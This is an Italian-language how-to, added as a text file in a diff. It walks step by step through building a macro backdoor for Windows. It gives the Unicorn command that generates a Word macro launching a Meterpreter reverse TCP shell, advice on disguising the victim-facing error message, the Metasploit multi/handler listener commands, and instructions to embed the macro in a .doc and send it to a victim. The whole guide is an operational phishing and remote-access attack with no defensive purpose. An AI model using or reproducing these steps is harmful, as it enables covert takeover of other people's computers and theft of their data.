@@ -1,0 +1,104 @@
+	***	MACRO BACKDOOR con Kali Linux	***
+
+Guida per ottere controllo remoto di Windows sfruttando le macro 
+che possono essere utilizzate nei documenti MS OFFICE.
+Questa tecnica è più articolata rispetto alla creazione della semplice Backdoor con metasploit non 
+criptata ma certamente più convincente per la vittima che dovrà aprire un documento Word invece che
+un programma ".exe" e servono 3 strumenti:
+- Unicorn (reperibile online)
+- Metasploit
+- MS OFFICE
+
+
+
+-- PRIMA PARTE --
+
+Per fare questo attacco dobbiamo procuraci un tool per la nostra
+Kali Linux  che si chiama unicorn
+[link per download unicorn: https://github.com/trustedsec/unicorn]
+e anche Microsoft Office per creare il file con la macro interna!
+
+Nella cartella unicorn c'è il file python quindi basta scaricare tutto 
+(nel formato .zip) e richiamare il file.
+Se non si scarica il file zippato è possibile clonare il contenuto della pagina
+di github tramite il comando su terminale:
+"git clone https://github.com/trustedsec/unicorn"
+La cartella è contenuta nella home.
+
+Entra nella cartella (se non sei già nella directory home)
+Entra nella cartella unicorn (cd unicorn/) dove trovi il file 
+"unicorn.py".
+Per eseguirlo bisogna richiamare l'interprete:
+python unicorn.py e premi [INVIO] e compaiono varie opzioni!
+Noi siamo interessati all'attacco "Macro Example", in quanto questa
+voce ci permette di creare il file che sarà la macro che devo inserire
+nel documento Word.
+
+Ripetere il procedimento però usando la sintassi della voce "Macro Example" --> python unicorn.py windows/meterpreter/reverse_tcp X.X.X.X 443 macro [INVIO]
+
+## ATTENZIONE ##
+Il parametro "X.X.X.X" è il tuo indirizzo ip che puoi scoprire tramite il comando "ifconfig" sempre da terminale!
+
+Ora il codice python elabora per qualche istante...e ci restituisce un file
+di testo ".txt" che contiene la futura macro di Word.
+
+Ora dobbiamo aprire il file (che è sempre nella cartella unicorn) in quanto 
+dobbiamo modificare il contenuto della stringa del MessageBox poichè scritta
+in lingua inglese e modificala in lingua Italiana a piacere, cercando di 
+rendere il messaggio il più reale possibile.
+
+Variabile  "title" --> contiene il titolo MessageBox
+Variabile "msg" --> contiene il contenuto del MessageBox che ci indica l'errore.
+
+Salva il file di testo e avvia metasploit con il comando "msfconsole".
+Metasploit ci serve per rimanere in ascolto della vittima che aprirà il documento Word.
+
+use/multi/handler [invio] --> per rimanere in ascolto
+set PAYLOAD windows/meterpreter/reverse_tcp [INVIO] --> connessione
+set LHOST X.X.X.X (il tuo indirizzo IP che hai usato prima) [INVIO] --> per impostare ip
+set LPORT 443 (se prima hai usato sempre questa porta) [INVIO] --> imposti la porta
+exploit [INVIO] --> ora inizia a rimanere in ascolto 
+
+
+
+-- SECONDA PARTE  --
+
+Dobbiamo andare su Windows e creare un documento Word, nel quale inserire il contenuto 
+del documento di testo ottenuto dal tool Unicorn di Kali Linux per creare la macro.
+
+Visualizza,Macro,Dare un nome alla macro,crea
+Nella seconda schermata che si apre premere nel menù la voce 
+"Microsoft Word Oggetti" la voce "ThisDocument" e incolliamo il contenuto
+del file di testo e salva la macro!
+Scrivi qualcosa nel documento di testo per renderlo più reale.
+Salva il documento Word scegliendo il formato "97-2003" --> ".doc" 
+
+Invia documento alla vittima.
+
+
+
+-- TERZA PARTE  --
+
+Ora che hai inviato il documento Word .doc alla tua vittima attendi che apra il documento Word,
+e una volta aperto compare il MessageBox (messaggio di errore modificato prima) e preme "OK".
+La macro richiama "powershell" (è normale che compaia qualche istante" e si instaura quindi
+la connessione inversa dalla macchina Windows verso Kali Linux!
+
+
+
+
+BUON HACKING!
+Federico Coppola
+
+
+
+
+
+
+
+
+
+
+
+
+
